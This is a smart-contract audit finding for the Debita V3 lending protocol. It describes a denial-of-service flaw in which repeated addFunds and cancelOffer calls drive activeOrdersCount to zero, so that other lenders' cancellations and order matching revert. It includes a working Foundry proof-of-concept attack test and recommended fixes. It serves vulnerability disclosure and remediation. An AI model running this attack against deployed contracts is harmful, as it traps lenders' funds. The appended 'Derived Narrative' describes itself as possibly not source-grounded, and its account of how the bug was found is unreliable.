---
id: 1836
severity: "Medium"
---

# Attacker will prevent lenders

## Description

The missing active order check in DLOImplementation::addFunds will allow an attacker to halt the cancellation of lend orders for lender and prevent non-perpetual lend orders from being fully matched as the attacker will execute the following attack path:
1. Call DLOFactory::createLendOrder to create a lend order
2. Call DLOImplementation::cancelOffer. DLOFactory::deleteOrder is called inside cancelOffer and decreases the DLOFactory::activeOrdersCount by 1.
3. Call DLOImplementation::addFunds to add funds to the lend order and pass the require statement in DLOImplementation::cancelOffer
4. Repeat steps 2 and 3 until DLOFactory::activeOrdersCount is 0
When activeOrdersCount is 0, further calls to the DLOFactory::deleteOrder function will revert due to arithmetic underflow. Consequently, functions calling deleteOrder will revert as well:
cancelOffer -> deleteOrder
DebitaV3Aggregator::matchOffersV3 -> acceptLendingOffer -> (if (lendInformation.availableAmount == 0 && !m_lendInformation.perpetual)) deleteOrder
There is a missing check in DLOImplementation::addFunds function that allows adding funds to an inactive offer.

```solidity
function addFunds(uint amount) public nonReentrant {
    require(
        msg.sender == lendInformation.owner ||
        IAggregator(aggregatorContract).isSenderALoan(msg.sender),
        "Only owner or loan"
    );
    SafeERC20.safeTransferFrom(
        IERC20(lendInformation.principle),
        msg.sender,
        address(this),
        amount
    );
    lendInformation.availableAmount += amount;
    IDLOFactory(factoryContract).emitUpdate(address(this));
}
```

This allows an attacker to add funds to a lend order that has been canceled and pass the require statement in DLOImplementation::cancelOffer. The attacker can then call cancelOffer to decrease the DLOFactory::activeOrdersCount value by 1.

```solidity
function cancelOffer() public onlyOwner nonReentrant {
    uint availableAmount = lendInformation.availableAmount;
    lendInformation.perpetual = false;
    lendInformation.availableAmount = 0;
    require(availableAmount > 0, "No funds to cancel");
    isActive = false;
    SafeERC20.safeTransfer(
        IERC20(lendInformation.principle),
        msg.sender,
        availableAmount
    );
    IDLOFactory(factoryContract).emitDelete(address(this));
    IDLOFactory(factoryContract).deleteOrder(address(this));
    // emit canceled event on factory
}
```

```solidity
function deleteOrder(address _lendOrder) external onlyLendOrder {
    uint index = LendOrderIndex[_lendOrder];
    LendOrderIndex[_lendOrder] = 0;
    // switch index of the last borrow order to the deleted borrow order
    allActiveLendOrders[index] = allActiveLendOrders[activeOrdersCount - 1];
    LendOrderIndex[allActiveLendOrders[activeOrdersCount - 1]] = index;
    // take out last borrow order
    allActiveLendOrders[activeOrdersCount - 1] = address(0);
    activeOrdersCount--;
}
```

Internal pre-conditions
For Denial of Service in DLOImplementation::cancelOffer:
1. There needs to be at least an active lend order created by a legitimate user.
For DebitaV3Aggregator::matchOffersV3 to revert due to the attack path execution:
1. A legitimate user must create at least an active non-perpetual lend order with _startedLendingAmount greater than 0.
2. A borrow order that matches the non-perpetual lend order must exist.
3. DebitaV3Aggregator must not be paused.
4. The borrow order must borrow the full available amount of the matched lend order. This means that when the lend order is matched by calling matchOffersV3, DLOImplementation::acceptLendingOffer is called by DebitaV3Aggregator with amount equal to lendInformation.availableAmount.
External pre-conditions
Attack Path
Actors:
• Attacker: Exploits the addFunds logic to reduce DLOFactory::activeOrdersCount to 0.
• Lender: creates a lend order
• Borrower: creates a borrow order
• Aggregator User: calls DebitaV3Aggregator::matchOffersV3
Initial State:
Assume there is a non-perpetual lend order, created by the Lender and a borrow order created by the Borrower, both are active and can be matched. The borrow order will borrow the total of the lend order availableAmount. Under this condition, DLOFactory::activeOrdersCount = 1.
Attack Path:
1. The attacker calls DLOFactory::createLendOrder to create a lend order. This function will increase the DLOFactory::activeOrdersCount by 1.
DLOFactory::activeOrdersCount = 2
2. The attacker calls DLOImplementation::cancelOffer to cancel his lend order. This function calls DLOFactory::deleteOrder which will decrease the DLOFactory::activeOrdersCount by 1.
DLOFactory::activeOrdersCount = 1
3. The attacker calls DLOImplementation::addFunds with 1 as the amount parameter. This function will add 1 to the lend order's availableAmount and allow the attacker to pass the require statement in DLOImplementation::cancelOffer.
4. The attacker calls DLOImplementation::cancelOffer to decrease the activeOrdersCount by 1.
DLOFactory::activeOrdersCount = 0
5. The Aggregator User calls DebitaV3Aggregator::matchOffersV3 to match the non-perpetual lend order with the borrow order. This function calls DLOImplementation::acceptLendingOffer with amount equal to lendInformation.availableAmount. As the lend order availableAmount is now 0, the if statement in DLOImplementation::acceptLendingOffer is true
lendInformation.availableAmount == 0 && !m_lendInformation.perpetual
and DLOFactory::deleteOrder is called inside acceptLendingOffer. deleteOrder will try to decrease the DLOFactory::activeOrdersCount value by 1, but as its value is 0, the function will revert due to arithmetic underflow.
6. The Lender calls DLOImplementation::cancelOffer to cancel their lend order. DLOFactory::deleteOrder is called inside cancelOffer and will revert due to the activeOrdersCount being 0.
• Lenders cannot cancel their lend orders to withdraw their funds.
• Non-perpetual lend orders cannot be 100% accepted.
• A lender who wishes to cancel their lend order will be forced to create a new lend order with the sole purpose of increasing the DLOFactory::activeOrdersCount value and allowing the lender to cancel their initial lend order. This requires that the attacker cease the attack.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {DLOImplementation} from "@contracts/DebitaLendOffer-Implementation.sol";
import {DLOFactory} from "@contracts/DebitaLendOfferFactory.sol";
import {DBOImplementation} from "@contracts/DebitaBorrowOffer-Implementation.sol";
import {DBOFactory} from "@contracts/DebitaBorrowOffer-Factory.sol";
import {DebitaV3Aggregator} from "@contracts/DebitaV3Aggregator.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {DebitaIncentives} from "@contracts/DebitaIncentives.sol";
import {Ownerships} from "@contracts/DebitaLoanOwnerships.sol";
import {auctionFactoryDebita} from "@contracts/auctions/AuctionFactory.sol";
import {DebitaV3Loan} from "@contracts/DebitaV3Loan.sol";
import {DynamicData} from "../../interfaces/getDynamicData.sol";

contract DOSTest is Test {
    DBOFactory public DBOFactoryContract;
    DLOFactory public DLOFactoryContract;
    Ownerships public ownershipsContract;
    DebitaIncentives public incentivesContract;
    DebitaV3Aggregator public DebitaV3AggregatorContract;
    auctionFactoryDebita public auctionFactoryDebitaContract;
    DebitaV3Loan public DebitaV3LoanContract;
    ERC20Mock public AEROContract;
    ERC20Mock public USDCContract;
    ERC20Mock public wETHContract;
    DLOImplementation public LendOrder;
    DBOImplementation public BorrowOrder;
    DynamicData public allDynamicData;

    address USDC;
    address wETH;
    address borrower = address(0x02);
    address lender1 = address(0x03);
    address lender2 = address(0x04);
    address lender3 = address(0x05);
    address feeAddress = address(this);

    function setUp() public {
        allDynamicData = new DynamicData();
        ownershipsContract = new Ownerships();
        incentivesContract = new DebitaIncentives();
        DBOImplementation borrowOrderImplementation = new DBOImplementation();
        DBOFactoryContract = new DBOFactory(address(borrowOrderImplementation));
        DLOImplementation proxyImplementation = new DLOImplementation();
        DLOFactoryContract = new DLOFactory(address(proxyImplementation));
        auctionFactoryDebitaContract = new auctionFactoryDebita();
        USDCContract = new ERC20Mock();
        wETHContract = new ERC20Mock();
        DebitaV3Loan loanInstance = new DebitaV3Loan();
        DebitaV3AggregatorContract = new DebitaV3Aggregator(
            address(DLOFactoryContract),
            address(DBOFactoryContract),
            address(incentivesContract),
            address(ownershipsContract),
            address(auctionFactoryDebitaContract),
            address(loanInstance)
        );
        USDC = address(USDCContract);
        wETH = address(wETHContract);
        wETHContract.mint(address(this), 15 ether);
        wETHContract.mint(lender1, 5 ether);
        wETHContract.mint(lender2, 5 ether);
        wETHContract.mint(lender3, 5 ether);
        ownershipsContract.setDebitaContract(
            address(DebitaV3AggregatorContract)
        );
        incentivesContract.setAggregatorContract(
            address(DebitaV3AggregatorContract)
        );
        DLOFactoryContract.setAggregatorContract(
            address(DebitaV3AggregatorContract)
        );
        DBOFactoryContract.setAggregatorContract(
            address(DebitaV3AggregatorContract)
        );
        auctionFactoryDebitaContract.setAggregator(
            address(DebitaV3AggregatorContract)
        );
    }

    // Attack path:
    // 1. multiple lend offers are created
    // 2. borrow offer is created
    // 3. lender1 executes cancelOffer -> addFunds multiple times until DLOFactory::activeOrdersCount == 0
    // 4. user calls matchOffersV3 and another lender calls cancelOffer. Both should fail
    function testDOSAttack() public {
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        uint[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        uint[] memory ratio = allDynamicData.getDynamicUintArray(1);
        uint[] memory ratioLenders = allDynamicData.getDynamicUintArray(1);
        uint[] memory ltvsLenders = allDynamicData.getDynamicUintArray(1);
        bool[] memory oraclesActivatedLenders = allDynamicData.getDynamicBoolArray(1);
        address[] memory acceptedPrinciples = allDynamicData.getDynamicAddressArray(1);
        address[] memory acceptedCollaterals = allDynamicData.getDynamicAddressArray(1);
        address[] memory oraclesCollateral = allDynamicData.getDynamicAddressArray(1);
        address[] memory oraclesPrinciples = allDynamicData.getDynamicAddressArray(1);
        ratioLenders[0] = 1e18;
        ratio[0] = 1e18;
        acceptedPrinciples[0] = wETH;
        acceptedCollaterals[0] = USDC;
        oraclesActivated[0] = false;

        // Create multiple lend offers
        vm.startPrank(lender1);
        wETHContract.approve(address(DLOFactoryContract), 5 ether);
        address lendOffer1 = DLOFactoryContract.createLendOrder({
            _perpetual: false,
            _oraclesActivated: oraclesActivatedLenders,
            _lonelyLender: false,
            _LTVs: ltvsLenders,
            _apr: 1000,
            _maxDuration: 8640000,
            _minDuration: 86400,
            _acceptedCollaterals: acceptedCollaterals,
            _principle: wETH,
            _oracles_Collateral: oraclesCollateral,
            _ratio: ratioLenders,
            _oracleID_Principle: address(0x0),
            _startedLendingAmount: 5e18
        });
        vm.startPrank(lender2);
        wETHContract.approve(address(DLOFactoryContract), 5 ether);
        address lendOffer2 = DLOFactoryContract.createLendOrder({
            _perpetual: false,
            _oraclesActivated: oraclesActivatedLenders,
            _lonelyLender: false,
            _LTVs: ltvsLenders,
            _apr: 1000,
            _maxDuration: 8640000,
            _minDuration: 86400,
            _acceptedCollaterals: acceptedCollaterals,
            _principle: wETH,
            _oracles_Collateral: oraclesCollateral,
            _ratio: ratioLenders,
            _oracleID_Principle: address(0x0),
            _startedLendingAmount: 5e18
        });
        vm.startPrank(lender3);
        wETHContract.approve(address(DLOFactoryContract), 5 ether);
        address lendOffer3 = DLOFactoryContract.createLendOrder({
            _perpetual: false,
            _oraclesActivated: oraclesActivatedLenders,
            _lonelyLender: false,
            _LTVs: ltvsLenders,
            _apr: 1000,
            _maxDuration: 8640000,
            _minDuration: 86400,
            _acceptedCollaterals: acceptedCollaterals,
            _principle: wETH,
            _oracles_Collateral: oraclesCollateral,
            _ratio: ratioLenders,
            _oracleID_Principle: address(0x0),
            _startedLendingAmount: 5e18
        });
        vm.stopPrank();

        // Create a borrow offer
        USDCContract.mint(borrower, 10e18);
        vm.startPrank(borrower);
        USDCContract.approve(address(DBOFactoryContract), 100e18);
        address borrowOrderAddress = DBOFactoryContract.createBorrowOrder({
            _oraclesActivated: oraclesActivated,
            _LTVs: ltvs,
            _maxInterestRate: 1400,
            _duration: 864000,
            _acceptedPrinciples: acceptedPrinciples,
            _collateral: USDC,
            _isNFT: false,
            _receiptID: 0,
            _oracleIDS_Principles: oraclesPrinciples,
            _ratio: ratio,
            _oracleID_Collateral: address(0x0),
            _collateralAmount: 10e18
        });
        vm.stopPrank();

        // Lender1 begins the attack
        // check DLOFactory::activeOrdersCount == 3
        assertEq(DLOFactoryContract.activeOrdersCount(), 3);

        // lender1 cancels the offer -> DLOFactory::activeOrdersCount == 2
        vm.startPrank(lender1);
        DLOImplementation(lendOffer1).cancelOffer();

        // addFunds (1 wei)
        wETHContract.approve(lendOffer1, 3);
        DLOImplementation(lendOffer1).addFunds(1);

        // cancelOffer again -> DLOFactory::activeOrdersCount == 1
        DLOImplementation(lendOffer1).cancelOffer();

        // addFunds (1 wei)
        DLOImplementation(lendOffer1).addFunds(1);

        // lender1 cancels the offer -> DLOFactory::activeOrdersCount == 0
        DLOImplementation(lendOffer1).cancelOffer();
        vm.stopPrank();

        // check DLOFactory::activeOrdersCount == 0
        assertEq(DLOFactoryContract.activeOrdersCount(), 0);

        // now try to call matchOffersV3 -> should fail
        address[] memory lendOrders = new address[](1);
        uint[] memory lendAmounts = allDynamicData.getDynamicUintArray(1);
        uint[] memory percentagesOfRatio = allDynamicData.getDynamicUintArray(1);
        uint[] memory indexForPrinciple_BorrowOrder = allDynamicData.getDynamicUintArray(1);
        uint[] memory indexForCollateral_LendOrder = allDynamicData.getDynamicUintArray(1);
        uint[] memory indexPrinciple_LendOrder = allDynamicData.getDynamicUintArray(1);
        lendOrders[0] = lendOffer3;
        percentagesOfRatio[0] = 10000;
        lendAmounts[0] = 5e18;
        vm.expectRevert(stdError.arithmeticError);
        address deployedLoan = DebitaV3AggregatorContract.matchOffersV3({
            lendOrders: lendOrders,
            lendAmountPerOrder: lendAmounts,
            porcentageOfRatioPerLendOrder: percentagesOfRatio,
            borrowOrder: borrowOrderAddress,
            principles: acceptedPrinciples,
            indexForPrinciple_BorrowOrder: indexForPrinciple_BorrowOrder,
            indexForCollateral_LendOrder: indexForCollateral_LendOrder,
            indexPrinciple_LendOrder: indexPrinciple_LendOrder
        });

        // lender2 tries to cancel his lend order -> should fail
        vm.startPrank(lender2);
        vm.expectRevert(stdError.arithmeticError);
        DLOImplementation(lendOffer2).cancelOffer();
    }
}
```
Steps to reproduce:
1. Create a file DOSTest.t.sol inside Debita-V3-Contracts/test/local/Loan/ and paste the PoC code.
2. Run the test in terminal with the following command:
forge test --mt testDOSAttack

## Recommendation

Add a check in DLOImplementation::cancelOffer to prevent cancelling an inactive lend order.
```solidity
function cancelOffer() public onlyOwner nonReentrant {
    require(isActive, "Offer is not active");
    uint availableAmount = lendInformation.availableAmount;
    lendInformation.perpetual = false;
    lendInformation.availableAmount = 0;
    require(availableAmount > 0, "No funds to cancel");
    isActive = false;
```

Add a check in DLOImplementation::addFunds to prevent adding funds to an inactive offer, this will prevent lenders from getting their funds stuck in an inactive order.
```solidity
function addFunds(uint amount) public nonReentrant {
    require(
        msg.sender == lendInformation.owner ||
        IAggregator(aggregatorContract).isSenderALoan(msg.sender),
        "Only owner or loan"
    );
    require(isActive, "Offer is not active");
    SafeERC20.safeTransferFrom(
        IERC20(lendInformation.principle),
        msg.sender,
        address(this),
        amount
    );
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a denial‑of‑service condition caused by the absence of a validation that a lend order is active before additional funds can be added. The contract’s addFunds function permits any caller that is either the order owner or an authorized loan contract to increase the availableAmount of a lend order without checking whether the order has been marked inactive. Because cancelOffer sets the order’s isActive flag to false and then calls the factory’s deleteOrder, an attacker can repeatedly add a tiny amount of funds to a cancelled (inactive) order, invoke cancelOffer again, and thereby decrement the factory’s activeOrdersCount. By alternating addFunds and cancelOffer the attacker can drive activeOrdersCount to zero. When the count reaches zero, subsequent calls to deleteOrder attempt to decrement the counter below zero, triggering an arithmetic underflow and causing the transaction to revert. This revert propagates to higher‑level functions such as matchOffersV3 and acceptLendingOffer, preventing legitimate lenders from cancelling their orders, withdrawing funds, or having their non‑perpetual lend orders fully matched. The impact is that funds become stuck, lenders cannot retrieve their capital, and the matching engine is effectively halted, breaking the core lending functionality of the protocol. The condition occurs only when at least one non‑perpetual lend order exists and an attacker can create and cancel their own orders to manipulate the activeOrdersCount. It affects all participants who rely on the ability to cancel or match lend orders, including lenders, borrowers, and any aggregator users invoking matchOffersV3. The issue was discovered during a systematic audit that examined state transitions around order lifecycle management and identified that addFunds lacked an isActive guard. It is subtle because the addFunds call succeeds and appears harmless, yet it changes the internal accounting in a way that enables the underflow later. The bug belongs to the class of missing state‑validation or improper lifecycle checks, leading to arithmetic underflow and denial‑of‑service. From a user’s perspective, a lender may see that their order cannot be cancelled, receives no refund, or that the matching function suddenly reverts with an arithmetic error, even though the UI shows the order as existing. The expected behavior is that a cancelled order cannot receive further funds and that activeOrdersCount never drops below zero. To fix the issue, the contract should enforce that addFunds can only be called while the order is active, and cancelOffer should require the order to be active before proceeding, thereby preserving the integrity of the activeOrdersCount counter and preventing the underflow scenario.
